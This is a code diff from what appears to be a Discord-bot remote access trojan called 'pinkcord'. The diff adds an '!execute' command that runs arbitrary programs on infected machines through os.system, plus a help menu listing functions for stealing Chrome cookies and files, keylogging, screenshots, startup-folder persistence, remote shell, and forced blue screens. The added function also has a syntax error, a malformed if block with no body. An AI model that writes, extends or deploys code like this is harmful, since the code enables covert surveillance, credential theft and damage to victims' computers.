@@ -449,36 +449,46 @@ while True:
                     ERROR_CODE = 0xDEADDEAD
                     ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                     ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
+
+        @bot.command()
+        async def execute(ctx, session, program):
+            if session == "all":
+                os.system(program)
+                await ctx.send(f"Program '{program}' executed on all sessions.")
+            else:
+                if session == sesja:
+                await ctx.send(f"Program '{program}' executed on session {sesja}.")
         
         @bot.command()
         async def h(ctx):
             wiadomosc = '''
-!bsod [session] - display bsod(blue screen of death).
+!bsod [session] - Display BSOD (Blue Screen of Death).
 !cd [session] [path] - Changes the current directory on the remote computer.
 !cdrom [session] - Opens the CD-ROM drive.
-!chrome [session] [action(cookie)] - steals selected data from chrome
+!chrome [session] [action(cookie)] - Steals selected data from Chrome.
 !cli [session] - Copies the clipboard content.
 !click [session] [x] [y] - Clicks at a specific location on the screen.
-!delete [session] [path] -  Deletes a file from the remote computer.
+!delete [session] [path] - Deletes a file from the remote computer.
 !dir [session] - Displays the current directory on the remote computer.
 !down [session] - Decreases the volume on the remote computer.
+!execute [session] [program] - Executes a specific program on the remote computer.
 !info [session] - Retrieves information about the remote computer system.
 !keylogger [session] [action(start, stop, log)] - Starts or stops a keylogger on a remote computer.
-!kill [session] [task] - remote task killing.
+!kill [session] [task] - Remote task killing.
 !loc [session] - Displays IP information.
 !message [session] [title] [button] [message] - Displays a message on the remote computer.
 !press [session] [key] - Presses a specific key (default: Enter).
 !rename [session] [new_name] - Changes the name of a session.
-!restart [session] - Restart the remote computer.
+!restart [session] - Restarts the remote computer.
 !shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
 !sessions - Displays all sessions.
-!shutdown [session] - Shutdown the remote computer.
+!shutdown [session] - Shuts down the remote computer.
 !ss [session] - Captures a screenshot from a remote computer.
-!startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
+!startup [session] [file path] - Copies a file to the startup folder (you can copy pinkcord exe file).
 !steal [session] [file_names] - Steals files from a remote computer.
 !up [session] - Increases the volume on the remote computer.
 !upload [session] [link] [file_name] - Sends a file to the remote computer.
-!wallpaper [session] [path] -  changes the wallpaper on the remote computer.
+!wallpaper [session] [path] - Changes the wallpaper on the remote computer.
 !write [session] [message] - Types using the keyboard.
             '''
             await ctx.send(wiadomosc)
